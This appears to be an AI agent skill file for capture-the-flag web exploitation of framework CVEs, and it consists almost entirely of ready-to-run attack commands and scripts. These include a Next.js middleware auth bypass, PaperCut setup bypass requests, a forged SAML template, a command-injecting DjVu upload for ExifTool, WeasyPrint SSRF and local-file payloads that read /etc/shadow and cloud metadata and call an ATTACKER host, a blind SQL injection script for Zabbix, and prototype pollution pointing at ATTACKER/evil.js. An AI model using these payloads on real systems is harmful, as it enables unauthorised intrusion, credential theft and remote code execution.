---
name: ctf-web-cves
description: "CTF web CVE exploitation. Next.js middleware bypass, PaperCut admin bypass, Ruby-SAML forgery, Uvicorn CRLF injection, ExifTool DjVu RCE, WeasyPrint SSRF, Zabbix SQL injection, React Server Components RCE, prototype pollution. Triggers: 'cve exploit', 'framework cve', 'nextjs bypass', 'papercut', 'saml bypass', 'exiftool rce', 'weasyprint ssrf', 'zabbix sqli', 'prototype pollution', 'framework exploit ctf'."
---

# CTF Web — Framework CVEs

Next.js, PaperCut, Ruby-SAML, Uvicorn, ExifTool, WeasyPrint, Zabbix.

---

## Phase 1: Identify Framework/Version

```bash
TARGET="https://TARGET"

curl -sI "$TARGET" | grep -iE "x-powered-by|server|x-generator|via"
curl -s "$TARGET" | grep -iE "generator|framework|version" | head -5

curl -s "$TARGET/robots.txt"
curl -s "$TARGET/sitemap.xml"
curl -s "$TARGET/_next/static"  # Next.js
curl -s "$TARGET/wp-admin"      # WordPress
curl -s "$TARGET/rails/info"    # Ruby on Rails

curl -s "$TARGET/package.json"
curl -s "$TARGET/requirements.txt"
curl -s "$TARGET/Gemfile"
```

---

## Phase 2: Next.js Middleware Bypass

```bash
TARGET="https://TARGET"

curl -H "x-middleware-subrequest: 1" -H "x-middleware-subrequest: 1" \
  "$TARGET/admin/dashboard"

curl "$TARGET/admin%2Fdashboard"
curl "$TARGET/_next/../admin"

curl -H "x-middleware-subrequest: middleware" "$TARGET/api/admin"
```

---

## Phase 3: PaperCut Admin Bypass

```bash
TARGET="https://TARGET:9191"

curl -s "$TARGET/app?service=direct/1/Home/$Form$1" \
  -d "sp=S0&service=direct/1/SetupCompleted/$Form&_componentId=SetupCompleted"

curl -s "$TARGET/api/health" -H "Host: internal-server"

curl -s "$TARGET/api/user?username=admin" \
  -H "Authorization: ""  # empty auth header
```

---

## Phase 4: Ruby-SAML Forgery

```bash

python3 << 'EOF'
import base64, zlib

saml = """<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
  <Signature xmlns="http://www.w3.org/2000/09/xmldsig#">
    <SignedInfo>...</SignedInfo>
    <SignatureValue>FORGE</SignatureValue>
  </Signature>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>admin@target.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>"""

encoded = base64.b64encode(saml.encode()).decode()
print(f"SAMLResponse={encoded}")
EOF
```

---

## Phase 5: ExifTool DjVu RCE

```bash

TARGET="https://TARGET/upload"

pip install exiftool --break-system-packages

python3 << 'EOF'
import struct, socket

DJVU_HEADER = b"AT&TFORM"

MALICIOUS_ANNOT = b'(metadata (creator "$(id)"))'

with open('malicious.djvu', 'wb') as f:
    f.write(b"AT&TFORM\x00\x00\x00\xfcDJVUINFO\x00\x00\x00\x0a")
    f.write(b"\x00\x22\x00\x22\x00\x18\x00\x02\x00\x00")
    f.write(b"ANTa\x00\x00\x00\x1c")
    f.write(MALICIOUS_ANNOT)
EOF

curl -F "file=@malicious.djvu" "$TARGET"
```

---

## Phase 6: WeasyPrint SSRF/LFI

```bash
TARGET="https://TARGET/pdf/generate"

curl -s "$TARGET" -d 'html=<img src="http://169.254.169.254/latest/meta-data/">'
curl -s "$TARGET" -d 'html=<iframe src="file:///etc/passwd"></iframe>'
curl -s "$TARGET" -d 'html=<link rel="stylesheet" href="http://ATTACKER/evil.css">'

curl -s "$TARGET" -d 'html=<style>@font-face{font-family:a;src:url("file:///etc/shadow")}</style><p>test</p>'

curl -s "$TARGET" \
  -d 'html=<embed src="file:///flag" width="1000" height="1000">'
```

---

## Phase 7: Zabbix SQL Injection

```bash
TARGET="https://TARGET/api_jsonrpc.php"

curl -s "$TARGET" -H "Content-Type: application/json" -d '{
  "jsonrpc": "2.0",
  "method": "user.login",
  "params": {
    "username": "Admin",
    "password": "zabbix"
  },
  "id": 1
}'

python3 << 'EOF'
import requests, time

TARGET = "http://TARGET/api_jsonrpc.php"
AUTH = "YOUR_AUTH_TOKEN"

def check_char(pos, char):
    payload = f"' AND (SELECT 1 FROM (SELECT SLEEP(1.5))t WHERE SUBSTRING((SELECT VERSION()),{pos},1)='{char}')-- -"
    start = time.time()
    requests.post(TARGET, json={
        "jsonrpc": "2.0",
        "method": "host.create",
        "params": {"host": "x", "interfaces": [{"type": 1, "main": 1, "useip": 1, "ip": payload, "dns": "", "port": "10050"}]},
        "auth": AUTH, "id": 1
    })
    return time.time() - start > 1.3

version = ''
for pos in range(1, 10):
    for c in '0123456789.':
        if check_char(pos, c):
            version += c
            break
print(f"DB Version: {version}")
EOF
```

---

## Phase 8: Prototype Pollution

```javascript
// Deno import map hijacking via prototype pollution:
// Pollute Object.prototype to redirect module resolution

Object.prototype.__proto__ = {
    "url": "https://ATTACKER/evil.js"
};

// Common prototype pollution in Node.js apps:
// Payload via JSON:
{"__proto__": {"polluted": "yes"}}
{"constructor": {"prototype": {"polluted": "yes"}}}

// Test:
const obj = {};
console.log(obj.polluted); // "yes" if vulnerable

// Impact: can set arbitrary properties on any object
// → admin: true
// → NODE_OPTIONS: "--require /tmp/evil.js"
// → content-security-policy bypass
```

---

## Output

Save to `.omop/engagement/ctf/web/cves/`:
- `rce-output.txt` — command execution output
- `flag.txt` — captured flag
- `evidence.txt` — CVE confirmation

## Next Phase

→ `ctf-web-client-side` for XSS/client attacks
→ `pentest-report` for final report
